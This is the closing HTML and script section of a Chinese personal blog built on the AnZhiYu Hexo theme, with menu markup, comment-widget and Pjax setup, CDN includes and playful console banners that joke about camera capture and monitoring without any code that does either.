anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>